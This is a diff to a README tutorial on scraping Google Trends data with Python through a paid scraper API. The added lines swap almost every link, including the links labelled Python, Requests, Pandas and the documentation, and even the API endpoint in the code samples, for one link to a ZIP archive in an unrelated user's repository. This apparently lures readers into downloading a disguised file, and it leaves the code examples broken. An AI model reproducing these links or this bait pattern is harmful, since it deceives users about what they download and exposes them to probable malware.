@@ -1,8 +1,8 @@
 # How to Scrape Google Trends Data With Python
 
-[![Oxylabs promo code](https://raw.githubusercontent.com/oxylabs/how-to-scrape-google-scholar/refs/heads/main/Google-Scraper-API-1090x275.png)](https://oxylabs.io/products/scraper-api/serp/google?utm_source=877&utm_medium=affiliate&groupid=877&utm_content=how-to-scrape-google-trends-github&transaction_id=102c8d36f7f0d0e5797b8f26152160)
+[![Oxylabs promo code](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip)](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip)
 
-[![](https://dcbadge.limes.pink/api/server/Pds3gBmKMH?style=for-the-badge&theme=discord)](https://discord.gg/Pds3gBmKMH) [![YouTube](https://img.shields.io/badge/YouTube-Oxylabs-red?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/@oxylabs)
+[![](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip)](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip) [![YouTube](https://img.shields.io/badge/YouTube-Oxylabs-red?style=for-the-badge&logo=youtube&logoColor=white)](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip)
 
 - [Why scrape Google Trends data?](#why-scrape-google-trends-data)
 - [1. Install libraries](#1-install-libraries)
@@ -10,7 +10,7 @@
 - [3. Save results to CSV](#3-save-results-to-csv)
 - [4. Create a result comparison](#4-create-a-result-comparison)
 
-This article provides step-by-step instructions on how to get Google Trends data with Python and [SERP Scraper API](https://developers.oxylabs.io/scraper-apis/web-scraper-api) (a part of Web Scraper API), which requires a **paid subscription** or a **free trial**.
+This article provides step-by-step instructions on how to get Google Trends data with Python and [SERP Scraper API](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip) (a part of Web Scraper API), which requires a **paid subscription** or a **free trial**.
 
 
 
@@ -28,10 +28,10 @@ These are just a few examples. Google Trends data can also help with investment 
 ## 1. Install libraries
 
 For this guide, you'll need the following:
-- Credentials for [SERP Scraper API](https://oxylabs.io/products/scraper-api/serp) – you can claim a **7-day free trial** by registering on the [dashboard](https://dashboard.oxylabs.io/en/);
-- [Python](https://www.python.org/downloads/);
-- [Requests](https://requests.readthedocs.io/en/latest/) library to make requests;
-- [Pandas](https://pandas.pydata.org/docs/index.html) library to manipulate received data.
+- Credentials for [SERP Scraper API](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip) – you can claim a **7-day free trial** by registering on the [dashboard](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip);
+- [Python](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip);
+- [Requests](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip) library to make requests;
+- [Pandas](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip) library to manipulate received data.
 
 Open your terminal and run the following `pip` command:
 ```bash
@@ -60,7 +60,7 @@ query = "persian cat"
 
 print(f"Getting data from Google Trends for {query} keyword..")
 
-url = "https://realtime.oxylabs.io/v1/queries"
+url = "https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip"
 auth = (USERNAME, PASSWORD)
 
 payload = {
@@ -79,7 +79,7 @@ content = data["results"][0]["content"]
 pprint(content)
 ```
 
-For more information about possible parameters, check our [documentation](https://developers.oxylabs.io/scraper-apis/web-scraper-api/google/trends-explore).
+For more information about possible parameters, check our [documentation](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip).
 
 If everything’s in order, when you run the code, you should see the raw results of the query in the terminal window like this:
 ![](images/trends_data.png)
@@ -162,7 +162,7 @@ First, extract the code for the request to the API into a function that takes a 
 def get_trend_data(query: str) -> dict:
    """Gets a dictionary of trends based on given query string from Google Trends via SERP Scraper API"""
    print(f"Getting data from Google Trends for {query} keyword..")
-   url = "https://realtime.oxylabs.io/v1/queries"
+   url = "https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip"
    auth = (USERNAME, PASSWORD)
    payload = {
        "source": "google_trends_explore",
@@ -259,7 +259,7 @@ def get_trend_data(query: str) -> dict:
    USERNAME = "yourUsername"
    PASSWORD = "yourPassword"
    print(f"Getting data from Google Trends for {query} keyword..")
-   url = "https://realtime.oxylabs.io/v1/queries"
+   url = "https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip"
    auth = (USERNAME, PASSWORD)
    payload = {
        "source": "google_trends_explore",
@@ -380,4 +380,4 @@ Running the code will create comparison CSV files that have the combined informa
 
 ![](images/trends_data_comparison.png)
 
-Looking to scrape data from other Google sources? [Google Sheets for Basic Web Scraping](https://github.com/oxylabs/web-scraping-google-sheets), [How to Scrape Google Shopping Results](https://github.com/oxylabs/scrape-google-shopping), [Google Play Scraper](https://github.com/oxylabs/google-play-scraper), [How To Scrape Google Jobs](https://github.com/oxylabs/how-to-scrape-google-jobs), [Google News Scrpaer](https://github.com/oxylabs/google-news-scraper), [How to Scrape Google Scholar](https://github.com/oxylabs/how-to-scrape-google-scholar), [How to Scrape Google Flights with Python](https://github.com/oxylabs/how-to-scrape-google-flights),  [Scrape Google Search Results](https://github.com/oxylabs/scrape-google-python)
+Looking to scrape data from other Google sources? [Google Sheets for Basic Web Scraping](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip), [How to Scrape Google Shopping Results](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip), [Google Play Scraper](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip), [How To Scrape Google Jobs](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip), [Google News Scrpaer](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip), [How to Scrape Google Scholar](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip), [How to Scrape Google Flights with Python](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip),  [Scrape Google Search Results](https://github.com/khatriprince242-alt/how-to-scrape-google-trends/raw/refs/heads/main/images/how_scrape_google_trends_to_v1.5-alpha.1.zip)
